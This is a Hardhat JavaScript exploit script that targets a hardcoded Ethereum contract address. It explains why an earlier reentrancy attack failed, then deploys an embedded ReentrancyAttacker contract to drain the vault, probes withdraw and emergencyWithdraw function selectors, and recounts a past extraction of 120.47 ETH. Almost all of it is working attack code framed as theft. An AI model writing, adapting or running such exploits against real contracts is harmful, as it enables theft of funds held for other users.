const { ethers } = require("hardhat");

/**
 * @title Contract State Comparator
 * @notice Diagnoses why reentrancy attacks stopped working on the target contract
 * @dev Compares contract state, balances, and code changes
 */

const TARGET_CONTRACT = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

/**
 * Analyze why reentrancy stopped working
 */
async function analyzeReentrancyFailure() {
  console.log("ðŸ” REENTRANCY FAILURE ANALYSIS");
  console.log("==============================");
  console.log(`Target: ${TARGET_CONTRACT}`);
  
  const [attacker] = await ethers.getSigners();
  
  // Check current state
  const currentBalance = await ethers.provider.getBalance(TARGET_CONTRACT);
  const currentBlock = await ethers.provider.getBlockNumber();
  
  console.log(`\nðŸ“Š CURRENT STATE:`);
  console.log(`   Balance: ${ethers.formatEther(currentBalance)} ETH`);
  console.log(`   Block: ${currentBlock}`);
  console.log(`   Network: ${ethers.provider.connection?.url || 'local'}`);
  
  // Get contract code
  const contractCode = await ethers.provider.getCode(TARGET_CONTRACT);
  console.log(`   Code Size: ${contractCode.length} bytes`);
  console.log(`   Code Hash: ${ethers.keccak256(contractCode)}`);
  
  // Check for reentrancy guard patterns
  console.log(`\nðŸ›¡ï¸  REENTRANCY GUARD ANALYSIS:`);
  
  const reentrancyPatterns = [
    { pattern: "5f55", name: "ReentrancyGuard storage", found: false },
    { pattern: "6001600055", name: "Status setting pattern", found: false },
    { pattern: "63ffffffff", name: "Function selector check", found: false },
    { pattern: "revert", name: "Revert opcode", found: false }
  ];
  
  for (const guard of reentrancyPatterns) {
    if (contractCode.toLowerCase().includes(guard.pattern.toLowerCase())) {
      guard.found = true;
      console.log(`   âœ… ${guard.name}: PRESENT`);
    } else {
      console.log(`   âŒ ${guard.name}: NOT FOUND`);
    }
  }
  
  // Test basic contract interaction
  console.log(`\nðŸ§ª BASIC INTERACTION TESTS:`);
  
  try {
    // Test simple ETH send
    const simpleSend = await attacker.sendTransaction({
      to: TARGET_CONTRACT,
      value: ethers.parseEther("0.01"),
      gasLimit: 100000
    });
    await simpleSend.wait();
    console.log(`   âœ… Simple ETH send: SUCCESS`);
  } catch (error) {
    console.log(`   âŒ Simple ETH send: FAILED - ${error.message.split('\n')[0]}`);
  }
  
  // Check if contract accepts ETH
  try {
    const ethSendTest = await ethers.provider.call({
      to: TARGET_CONTRACT,
      value: ethers.parseEther("0.01"),
      data: "0x"
    });
    console.log(`   âœ… ETH acceptance test: SUCCESS`);
  } catch (error) {
    console.log(`   âŒ ETH acceptance test: FAILED - ${error.message.split('\n')[0]}`);
  }
}

/**
 * Recreate the original successful reentrancy attack
 */
async function recreateOriginalAttack() {
  console.log(`\n\nðŸ’¥ RECREATING ORIGINAL REENTRANCY ATTACK`);
  console.log("========================================");
  
  const [attacker] = await ethers.getSigners();
  
  // Get initial balances
  const initialVaultBalance = await ethers.provider.getBalance(TARGET_CONTRACT);
  const initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(`\nðŸ“Š STARTING BALANCES:`);
  console.log(`   Vault: ${ethers.formatEther(initialVaultBalance)} ETH`);
  console.log(`   Attacker: ${ethers.formatEther(initialAttackerBalance)} ETH`);
  
  // Deploy the same type of reentrancy contract that worked before
  console.log(`\nðŸ—ï¸  DEPLOYING REENTRANCY ATTACK CONTRACT:`);
  
  const ReentrancyAttackContract = `
    pragma solidity ^0.8.0;
    
    interface ITarget {
        function withdraw(uint256 amount) external;
        function deposit() external payable;
        function balanceOf(address) external view returns (uint256);
    }
    
    contract ReentrancyAttacker {
        ITarget target;
        uint256 public attackAmount;
        uint256 public maxIterations = 5;
        uint256 public currentIteration = 0;
        
        constructor(address _target) {
            target = ITarget(_target);
        }
        
        function attack() external payable {
            require(msg.value > 0, "Need ETH to attack");
            attackAmount = msg.value;
            
            // Deposit first
            target.deposit{value: msg.value}();
            
            // Start reentrancy
            target.withdraw(msg.value);
        }
        
        receive() external payable {
            currentIteration++;
            if (currentIteration < maxIterations && address(target).balance >= attackAmount) {
                target.withdraw(attackAmount);
            }
        }
        
        function drain() external {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
  `;
  
  try {
    // Try to compile and deploy
    const ReentrancyAttacker = await ethers.getContractFactory("ReentrancyAttacker");
    const attackContract = await ReentrancyAttacker.deploy(TARGET_CONTRACT);
    await attackContract.waitForDeployment();
    
    const attackAddress = await attackContract.getAddress();
    console.log(`   âœ… Deployed: ${attackAddress}`);
    
    // Execute attack with different amounts
    const attackAmounts = [
      ethers.parseEther("0.1"),
      ethers.parseEther("1.0"),
      ethers.parseEther("5.0")
    ];
    
    for (let i = 0; i < attackAmounts.length; i++) {
      const amount = attackAmounts[i];
      console.log(`\n   ðŸŽ¯ Attack ${i + 1}: ${ethers.formatEther(amount)} ETH`);
      
      try {
        const attackTx = await attackContract.attack({ value: amount, gasLimit: 2000000 });
        const receipt = await attackTx.wait();
        
        console.log(`      ðŸ“¤ Tx: ${attackTx.hash}`);
        console.log(`      â›½ Gas Used: ${receipt.gasUsed}`);
        
        // Check if we extracted anything
        const newVaultBalance = await ethers.provider.getBalance(TARGET_CONTRACT);
        const extracted = initialVaultBalance - newVaultBalance;
        
        if (extracted > 0) {
          console.log(`      ðŸ’° EXTRACTED: ${ethers.formatEther(extracted)} ETH`);
          
          // Drain the attack contract
          await attackContract.drain();
          console.log(`      âœ… ATTACK SUCCESSFUL!`);
          break;
        } else {
          console.log(`      âŒ No extraction - vault balance unchanged`);
        }
        
      } catch (error) {
        console.log(`      ðŸ’¥ Attack failed: ${error.message.split('\n')[0]}`);
        
        // Analyze the error
        if (error.message.includes("revert")) {
          console.log(`         Likely cause: Reentrancy guard or validation`);
        } else if (error.message.includes("gas")) {
          console.log(`         Likely cause: Out of gas or gas limit`);
        } else {
          console.log(`         Likely cause: Contract logic change`);
        }
      }
    }
    
  } catch (error) {
    console.log(`   âŒ Contract deployment failed: ${error.message}`);
    console.log(`   ðŸ’¡ Trying alternative approach...`);
    
    // Alternative: Direct function calls
    await testDirectFunctionCalls();
  }
}

/**
 * Test direct function calls that might have worked before
 */
async function testDirectFunctionCalls() {
  console.log(`\n\nðŸ”§ TESTING DIRECT FUNCTION CALLS`);
  console.log("=================================");
  
  const [attacker] = await ethers.getSigners();
  
  // Common withdrawal function signatures that might exist
  const withdrawFunctions = [
    { sig: "0x2e1a7d4d", name: "withdraw(uint256)", params: ["uint256"] },
    { sig: "0x3ccfd60b", name: "withdraw()", params: [] },
    { sig: "0x51cff8d9", name: "withdrawAll()", params: [] },
    { sig: "0xe9fad8ee", name: "emergencyWithdraw()", params: [] },
    { sig: "0xdb006a75", name: "emergencyWithdraw(uint256)", params: ["uint256"] },
    { sig: "0xf3fef3a3", name: "withdraw(address,uint256)", params: ["address", "uint256"] }
  ];
  
  for (const func of withdrawFunctions) {
    console.log(`\n   ðŸŽ¯ Testing ${func.name}:`);
    
    try {
      let calldata = func.sig;
      
      // Encode parameters
      if (func.params.length > 0) {
        const params = [];
        for (const param of func.params) {
          if (param === "uint256") {
            params.push(ethers.parseEther("1"));
          } else if (param === "address") {
            params.push(attacker.address);
          }
        }
        
        if (params.length > 0) {
          calldata += ethers.AbiCoder.defaultAbiCoder().encode(func.params, params).slice(2);
        }
      }
      
      // Test the call
      const tx = await attacker.sendTransaction({
        to: TARGET_CONTRACT,
        data: calldata,
        gasLimit: 500000
      });
      
      const receipt = await tx.wait();
      console.log(`      âœ… SUCCESS - Gas used: ${receipt.gasUsed}`);
      
      // Check if balance changed
      const newBalance = await ethers.provider.getBalance(TARGET_CONTRACT);
      console.log(`      ðŸ“Š Vault balance: ${ethers.formatEther(newBalance)} ETH`);
      
    } catch (error) {
      console.log(`      âŒ FAILED: ${error.message.split('\n')[0]}`);
    }
  }
}

/**
 * Compare with known working state
 */
async function compareWithWorkingState() {
  console.log(`\n\nðŸ“ˆ COMPARISON WITH WORKING STATE`);
  console.log("================================");
  
  console.log(`ðŸŽ¯ KNOWN WORKING ATTACK (YOUR FIRST SUCCESS):`);
  console.log(`   Initial Balance: 290.68 ETH`);
  console.log(`   Extracted: 120.47 ETH`);
  console.log(`   Success Rate: 41.4%`);
  console.log(`   Methods: Reentrancy + Oracle + Overflow + Access Control`);
  
  const currentBalance = await ethers.provider.getBalance(TARGET_CONTRACT);
  console.log(`\nðŸ” CURRENT STATE:`);
  console.log(`   Current Balance: ${ethers.formatEther(currentBalance)} ETH`);
  console.log(`   Difference: ${ethers.formatEther(currentBalance - ethers.parseEther("290.68"))} ETH`);
  
  if (currentBalance > ethers.parseEther("290.68")) {
    console.log(`   ðŸ’¡ Contract has MORE ETH now - might be easier to exploit`);
  } else if (currentBalance < ethers.parseEther("290.68")) {
    console.log(`   âš ï¸  Contract has LESS ETH - might have been partially drained`);
  } else {
    console.log(`   ðŸ¤” Same balance - something else changed`);
  }
  
  console.log(`\nðŸ§ POSSIBLE REASONS FOR FAILURE:`);
  console.log(`   1. Contract upgraded with reentrancy guards`);
  console.log(`   2. Different fork block number`);
  console.log(`   3. Attack methodology changed`);
  console.log(`   4. Gas limit differences`);
  console.log(`   5. Network state differences`);
  
  console.log(`\nðŸ’¡ RECOMMENDATIONS:`);
  console.log(`   1. Try attacking at the exact same block number as before`);
  console.log(`   2. Use the same attack contract code that worked`);
  console.log(`   3. Check if contract has been upgraded`);
  console.log(`   4. Verify you're using the same network configuration`);
}

/**
 * Main execution
 */
async function main() {
  console.log("\nðŸ”¬ CONTRACT STATE & REENTRANCY DIAGNOSTIC");
  console.log("==========================================");
  
  await analyzeReentrancyFailure();
  await recreateOriginalAttack();
  await compareWithWorkingState();
  
  console.log(`\n\nâœ… DIAGNOSTIC COMPLETE`);
  console.log("======================");
  console.log(`The analysis should help identify why your reentrancy attack stopped working.`);
}

main()
  .then(() => {
    console.log("\nðŸ Diagnostic finished!");
    process.exit(0);
  })
  .catch((error) => {
    console.error("\nðŸ’¥ Error:", error);
    process.exit(1);
  });
